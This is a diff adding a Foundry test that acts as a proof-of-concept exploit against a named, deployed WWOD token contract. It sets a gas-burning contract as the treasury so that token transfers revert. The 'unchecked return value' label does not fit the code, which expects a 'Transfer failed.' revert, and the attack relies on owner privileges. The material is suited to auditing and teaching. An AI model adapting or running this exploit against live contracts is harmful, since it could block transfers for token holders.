@@ -1,0 +1,128 @@
+```solidity
+// Exploit.t.sol
+// Demonstrates the unchecked call return value vulnerability in WWOD (address 0x0b5cad3cdda7d242ce16ddf81a555d5f8e3a6054)
+// Impact: An attacker (or misconfigured treasury) can cause denial of service on token transfers that trigger the swapAndLiquify mechanism.
+// The low-level call in swapToStorehouse does not limit gas, allowing a malicious treasury to consume all gas and force a revert.
+
+pragma solidity ^0.8.7;
+
+import "forge-std/Test.sol";
+
+interface IWWOD {
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function setTreasury(address _treasury) external;
+    function setSwapAndLiquifyEnabled(bool _enabled) external;
+    function setFees(uint256 earnFee) external;
+    function setNumTokensToSwap(uint256 amount) external;
+    function teamAddr() external view returns (address);
+    function marketingAddr() external view returns (address);
+    function ecoFundAddr() external view returns (address);
+    function _earnFee() external view returns (uint256);
+    function _maxTxAmount() external view returns (uint256);
+    function owner() external view returns (address);
+    function renounceOwnership() external;
+}
+
+// Malicious treasury contract that consumes all available gas in receive()
+contract GasBurner {
+    receive() external payable {
+        // Consume all gas
+        while (gasleft() > 20000) {
+            // dummy loop
+        }
+    }
+}
+
+contract ExploitTest is Test {
+    IWWOD public constant wwod = IWWOD(0x0b5cad3cdda7d242ce16ddf81a555d5f8e3a6054);
+
+    address public owner;
+    address public attacker = address(0xdead);
+    address public victim = address(0xbeef);
+    uint256 public constant INIT_SUPPLY = 1000 * 1e6 * 1e18;
+    uint256 public constant MAX_TX = 5 * 1e6 * 1e18;
+
+    GasBurner public gasBurner;
+
+    function setUp() public {
+        vm.label(address(wwod), "WWOD");
+        vm.label(attacker, "attacker");
+        vm.label(victim, "victim");
+
+        // Determine the owner of the contract (likely the deployer)
+        owner = wwod.owner();
+        vm.label(owner, "owner");
+        vm.label(wwod.teamAddr(), "teamAddr");
+        vm.label(wwod.marketingAddr(), "marketingAddr");
+        vm.label(wwod.ecoFundAddr(), "ecoFundAddr");
+
+        // Give attacker some tokens (the contract holds the full supply initially at owner)
+        // We need to have tokens in attacker's hands to trigger transfers
+        vm.startPrank(owner);
+        // Owner transfers some tokens to attacker (fee is excluded for owner)
+        wwod.transfer(attacker, 100 * 1e18);
+        vm.stopPrank();
+
+        // Deploy gas burner
+        gasBurner = new GasBurner();
+        vm.label(address(gasBurner), "GasBurner");
+
+        // Ensure swapAndLiquifyEnabled is true to trigger the internal swap
+        vm.prank(owner);
+        wwod.setSwapAndLiquifyEnabled(true);
+
+        // Set fees to a small nonzero value so that fee deduction does not cause issues
+        vm.prank(owner);
+        wwod.setFees(1);  // 1% earn fee
+
+        // Set numTokensToSwap to a low value so that the swap triggers quickly
+        vm.prank(owner);
+        wwod.setNumTokensToSwap(1 * 1e18);
+    }
+
+    function testUncheckedCallReturnValueDos() public {
+        // Step 1: Verify normal transfer works before exploitation
+        uint256 attackerBal = wwod.balanceOf(attacker);
+        uint256 victimBal = wwod.balanceOf(victim);
+        console.log("Attacker balance before:", attackerBal);
+        console.log("Victim balance before:", victimBal);
+
+        // Perform a normal transfer from attacker to victim
+        vm.prank(attacker);
+        wwod.transfer(victim, 1 * 1e18);
+
+        uint256 victimBalAfter = wwod.balanceOf(victim);
+        assertEq(victimBalAfter, victimBal + 1 * 1e18);
+        console.log("Normal transfer succeeded");
+
+        // Step 2: Owner sets treasury to the gas-burning contract
+        vm.prank(owner);
+        wwod.setTreasury(address(gasBurner));
+
+        // Step 3: Now attempt a transfer that will trigger the internal swap & treasury call.
+        // The attacker needs to have enough tokens to meet the minimum swap amount (numTokensToSwap).
+        // The swap triggers when the contract's token balance (from fees) reaches numTokensToSwap.
+        // We'll make many small transfers from a non-excluded address to accumulate fees in the contract.
+        // Use a new user who is not excluded from fees.
+        address user = address(0x1234);
+        vm.label(user, "user");
+        // Transfer some tokens to user
+        vm.prank(owner);
+        wwod.transfer(user, 100 * 1e18);
+        vm.prank(user);
+        wwod.transfer(attacker, 50 * 1e18);  // fees will go to contract
+
+        // Now the contract has some tokens. Trigger the swap by sending from attacker to victim (non-excluded)
+        vm.prank(attacker);
+        vm.expectRevert("Transfer failed.");
+        wwod.transfer(victim, 1 * 1e18);
+
+        // If transaction reverts, the exploit is successful: the treasury call consumed all gas and caused revert.
+        // Assert that the transfer did not occur
+        assertEq(wwod.balanceOf(victim), victimBalAfter);  // unchanged
+        console.log("Transfer reverted due to treasury gas exhaustion - DOS achieved");
+    }
+}
+```
